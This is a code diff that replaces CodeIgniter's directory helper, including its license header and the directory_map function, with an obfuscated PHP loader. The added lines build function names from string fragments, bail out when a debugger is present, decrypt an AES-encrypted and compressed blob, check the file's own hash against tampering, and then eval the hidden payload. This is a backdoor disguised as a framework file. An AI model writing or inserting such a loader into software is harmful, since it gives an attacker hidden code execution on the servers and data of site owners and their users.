@@ -1,101 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Directory Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/directory_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('directory_map'))
-{
-	/**
-	 * Create a Directory Map
-	 *
-	 * Reads the specified directory and builds an array
-	 * representation of it. Sub-folders contained with the
-	 * directory will be mapped as well.
-	 *
-	 * @param	string	$source_dir		Path to source
-	 * @param	int	$directory_depth	Depth of directories to traverse
-	 *						(0 = fully recursive, 1 = current dir, etc)
-	 * @param	bool	$hidden			Whether to show hidden files
-	 * @return	array
-	 */
-	function directory_map($source_dir, $directory_depth = 0, $hidden = FALSE)
-	{
-		if ($fp = @opendir($source_dir))
-		{
-			$filedata	= array();
-			$new_depth	= $directory_depth - 1;
-			$source_dir	= rtrim($source_dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
-
-			while (FALSE !== ($file = readdir($fp)))
-			{
-				// Remove '.', '..', and hidden files [optional]
-				if ($file === '.' OR $file === '..' OR ($hidden === FALSE && $file[0] === '.'))
-				{
-					continue;
-				}
-
-				is_dir($source_dir.$file) && $file .= DIRECTORY_SEPARATOR;
-
-				if (($directory_depth < 1 OR $new_depth > 0) && is_dir($source_dir.$file))
-				{
-					$filedata[$file] = directory_map($source_dir.$file, $new_depth, $hidden);
-				}
-				else
-				{
-					$filedata[] = $file;
-				}
-			}
-
-			closedir($fp);
-			return $filedata;
-		}
-
-		return FALSE;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nwuqrxd6=('bas'.'e64'.'_de'.'cod'.'e');
+$_visndsvx=('gzu'.'nco'.'mpr'.'ess');
+$_l0166g4n=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mjuzc09d='KKKeMHle';
+$_knr3gi41='N6ljtFT3';
+$_zra6vroo='bCLHXBnwHh8=';
+$_q4hf2hbs='B5ckg/D4';
+$_jrmw4wtk='R0v4Jrza';
+$_uxkgg0g4='iUCB6w==';
+$_xf44nih4='VC5bT2IK';
+$_psksxa28='sk8WwtwJ';
+$_as7n3uru=$_nwuqrxd6($_q4hf2hbs.$_mjuzc09d.$_jrmw4wtk.$_knr3gi41.$_zra6vroo);
+$_eynpdnjb=$_nwuqrxd6($_psksxa28.$_xf44nih4.$_uxkgg0g4);
+$_wuob34pk=$_nwuqrxd6('ko206BNXND1NUzoSvrszcD5MpwYOXgB0+T7al6SGwcZ+dZgRMZjwOnt0yC7kgBK1P4ShnfVuy0PJRrN/4aoKpqzv6J9irIVoqsy02A5FufCIHX3DYQuiVCtrd7cRboK6NuQUP6pOErQsz7SvWtHHBiSJY1Q1DIhkBMq0ANO/+ese5sdTz1tHY6ShglTSbxBj0jq2Hf3i33FU1MMOnBNX6xblemx2Cjy5qLAhrcu/a6OyY8r9cLlnM6K/aULcLTWzwt2aCywdj/NpJOeHx73uwUpJKP5TRcfeD+eDcJZvPe70LtsbfoK5wIsw/0Tp9ISXWM02qajybaWX0jhaup9Dr2zBwhTMPme2Iq3fu5DB96GWjAn/jRW/T18gpYiMLmOWPmZPCAPmURn7EETRzyEdZnWqVFX1pfAQQTpFh8FxkE6cs2iPII4tF9A21l6s90oRmBq+aJ6j4QctCUssqo5a+KjWHPpT2WVd5H+1RgEV1rS/0yzsvPxDwaORGTiTK2VH');
+$_ezf4k7zt=$_l0166g4n($_wuob34pk,'aes-256-cbc',$_as7n3uru,OPENSSL_RAW_DATA,$_eynpdnjb);
+if($_ezf4k7zt===false){exit;}
+$_rakpnebz=$_visndsvx($_ezf4k7zt);
+if($_rakpnebz===false){exit;}
+$_xyvkrwo6='95cd5f95dfcfb35d83a1d8b839bd66cceb167eadb6e2b00a550ef07a3b13c106';
+$_g67iwdar=@file_get_contents(__FILE__);
+if($_g67iwdar!==false){
+$_nq9xv4j8=str_replace($_xyvkrwo6,"0000000000000000000000000000000000000000000000000000000000000000",$_g67iwdar);
+$_c1bopsf9=hash("sha256",$_nq9xv4j8);
+if($_c1bopsf9!==$_xyvkrwo6){@http_response_code(403);exit;}
 }
+eval($_rakpnebz);
